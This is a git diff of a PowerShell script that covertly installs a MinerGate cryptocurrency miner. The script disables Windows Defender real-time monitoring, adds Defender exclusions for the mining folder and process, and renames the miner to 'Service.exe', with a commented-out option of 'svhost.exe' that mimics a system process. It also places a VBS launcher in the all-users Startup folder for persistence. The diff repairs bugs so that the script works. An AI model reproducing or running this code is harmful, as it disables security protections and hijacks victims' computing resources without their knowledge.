@@ -19,15 +19,18 @@ $CPU = $CPUQuery / 2 # Get CPUs and divides it by 2 to allow computer to play no
 
 If ($Arc -eq "64-Bit") {
 
+# Create Folder
+
+New-Item -Path "C:\Mining" -ItemType directory #"C:\ProgramData\Minergate"
+
 # Set Exceptions and Disable Windows Defender. 
 
 Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPreference -ExclusionPath ""C:\Mining", "C:\Mining\MinerGate-cli-4.04-win64"" #"C:\ProgramData"
+Set-MpPreference -ExclusionPath "C:\Mining", "C:\Mining\MinerGate-cli-4.04-win64" #"C:\ProgramData"
 Set-MpPreference -ExclusionProcess "Service.exe"
 
 # Download latest Minergate Application and Extract it, Renaming Minergate-cli.exe to Service.exe
 
-New-Item -Path "C:\Mining" -ItemType directory #"C:\ProgramData\Minergate"
 Invoke-WebRequest -Uri $url -OutFile $output
 Expand-Archive -path $output -destinationpath $destination
 Rename-Item C:\Mining\MinerGate-cli-4.04-win64\Minergate-cli.exe Service.exe #C:\ProgramData\Minergate\MinerGate-cli-4.04-win64\Minergate-cli.exe svhost.exe
@@ -63,7 +66,7 @@ Register-ScheduledTask -Action $KillAction -Trigger $KillTrigger -TaskName "Kill
 
 # Copy vbs to Startup Folder
 
-Copy-Item C:\Miner\MinerGate-cli-4.04-win64\svhost.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+Copy-Item "C:\Mining\MinerGate-cli-4.04-win64\Startup.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 
 .\Startup.vbs #Starts the Miner
 
